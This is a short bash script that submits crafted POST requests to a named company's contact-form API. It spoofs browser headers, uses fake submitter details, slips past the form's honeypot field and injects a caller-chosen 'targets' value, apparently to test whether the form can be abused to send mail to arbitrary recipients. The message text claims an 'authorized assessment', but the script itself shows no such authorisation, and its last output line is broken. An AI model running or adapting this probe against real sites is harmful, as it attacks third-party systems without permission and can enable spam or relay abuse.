#!/bin/bash
# usage: send.sh "<targets value>" <outfile>
T="$1"; OUT="$2"
TOKEN="vrf$(head -c 9 /dev/urandom | base64 | tr -c 'a-zA-Z0-9' '' | cut -c1-10)"
curl -s -o "$OUT.body" -D "$OUT.hdr" -w '%{http_code}' \
  -X POST https://www.infinitycapital.bh/api/send \
  -H 'Content-Type: multipart/form-data' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/128 Safari/537.36' \
  -H 'Origin: https://www.infinitycapital.bh' \
  -H 'Referer: https://www.infinitycapital.bh/contact' \
  -F 'fname=Independent' -F 'lname=Verifier' -F 'areacode=+973' -F 'tel=36000000' \
  -F "cname=SecCheck" -F "subject=Partnership Inquiries" \
  -F "msg=Security verification test $TOKEN - please disregard, authorized assessment." \
  -F 'check=' -F "targets=$T"
echo " targets=[$T] http=$(cat $OUT.hdr >/dev/null; )"
